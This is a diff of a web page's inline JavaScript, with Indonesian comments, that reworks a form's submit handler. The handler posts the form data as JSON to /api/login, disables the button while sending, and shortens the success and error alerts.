@@ -409,34 +409,42 @@ body {
 document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
     e.preventDefault();
 
-    // 1. Ambil data dari form dan ubah ke objek biasa
+    // Pastikan tombol kirim berubah status agar user tidak klik berkali-kali
+    const btn = this.querySelector("button[type='submit']");
+    btn.innerText = "Mengirim...";
+    btn.disabled = true;
+
+    // Ambil data form
     const formData = new FormData(this);
     const data = Object.fromEntries(formData.entries());
 
     try {
-        // 2. Arahkan ke /api/login (sesuai nama file)
+        // Fetch ke api/login
         const res = await fetch("/api/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data) // Kirim sebagai JSON
+            body: JSON.stringify(data)
         });
 
         const result = await res.json();
 
         if (result.status === "success") {
-            alert("✅ Data berhasil dikirim ke admin");
+            alert("✅ Data Berhasil Dikirim!");
             this.reset();
         } else {
-            alert("❌ Gagal mengirim data: " + result.message);
+            alert("❌ Gagal: " + result.message);
         }
     } catch (err) {
-        console.error(err);
-        alert("❌ Error koneksi server");
+        alert("❌ Terjadi kesalahan koneksi ke server.");
+    } finally {
+        btn.innerText = "Kirim";
+        btn.disabled = false;
     }
 });
 </script>
  </body>
 </html>
+
 
 
 
